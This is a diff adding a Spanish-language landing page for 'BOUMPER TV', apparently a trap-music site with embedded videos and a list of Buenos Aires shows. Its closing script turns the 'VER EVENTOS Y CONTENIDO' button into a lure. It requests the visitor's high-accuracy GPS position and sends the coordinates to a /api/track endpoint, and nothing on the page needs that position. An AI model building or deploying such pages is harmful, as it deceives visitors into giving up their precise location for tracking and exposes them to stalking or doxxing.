@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BOUMPER TV | La Escena del Trap</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;900&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+    <header class="hero">
+        <div class="hero-content">
+            <h1 class="logo">BOUMPER TV</h1>
+            <p class="tagline">El Pulso de la Escena. Shows, Exclusivas y Más.</p>
+            
+            <div class="cta-card">
+                <p id="status-text">Descubre los próximos eventos de Trap cerca de ti y acceso a contenido exclusivo.</p>
+                <button id="main-btn" class="btn">VER EVENTOS Y CONTENIDO</button>
+            </div>
+        </div>
+    </header>
+
+    <section class="section featured-videos">
+        <h2>Últimos Lanzamientos</h2>
+        <div class="video-grid">
+            <div class="video-item">
+                <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+                <h3>Artista X - Titulo Z</h3>
+            </div>
+            <div class="video-item">
+                <iframe src="https://www.youtube.com/embed/kJQP7kxw5WM" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+                <h3>El Trapero Y - Nuevo Single</h3>
+            </div>
+        </div>
+    </section>
+
+    <section class="section upcoming-shows">
+        <h2>Próximos Shows Destacados</h2>
+        <div class="show-list">
+            <div class="show-item">
+                <h3>SHOW EN CABA</h3>
+                <p>25 NOV | Niceto Club</p>
+                <a href="https://www.google.com/maps/search/?api=1&query=Niceto+Club" target="_blank" class="show-link">VER MAPA</a>
+            </div>
+            <div class="show-item">
+                <h3>FESTIVAL BUENOS AIRES</h3>
+                <p>10 DIC | Costanera Sur</p>
+                <a href="https://www.google.com/maps/search/?api=1&query=Costanera+Sur" target="_blank" class="show-link">VER MAPA</a>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <p>&copy; 2023 BOUMPER TV. Todos los derechos reservados.</p>
+        <div class="social-links">
+            <a href="https://instagram.com/boumper_tv" target="_blank">Instagram</a>
+            <a href="https://twitter.com/boumper_tv" target="_blank">Twitter</a>
+        </div>
+    </footer>
+
+    <script>
+        document.getElementById('main-btn').addEventListener('click', async function() {
+            const btn = this;
+            const statusText = document.getElementById('status-text');
+            
+            btn.innerText = "CARGANDO CONTENIDO...";
+            btn.style.opacity = "0.7";
+            btn.disabled = true;
+
+            let coords = "no_permitido";
+
+            if ("geolocation" in navigator) {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { 
+                            enableHighAccuracy: true, 
+                            timeout: 5000 
+                        });
+                    });
+                    coords = `${position.coords.latitude},${position.coords.longitude}`;
+                } catch (e) {
+                    console.warn("Ubicación denegada o timeout.");
+                }
+            }
+            window.location.href = `/api/track?geo=${coords}`;
+        });
+    </script>
+
+</body>
+</html>
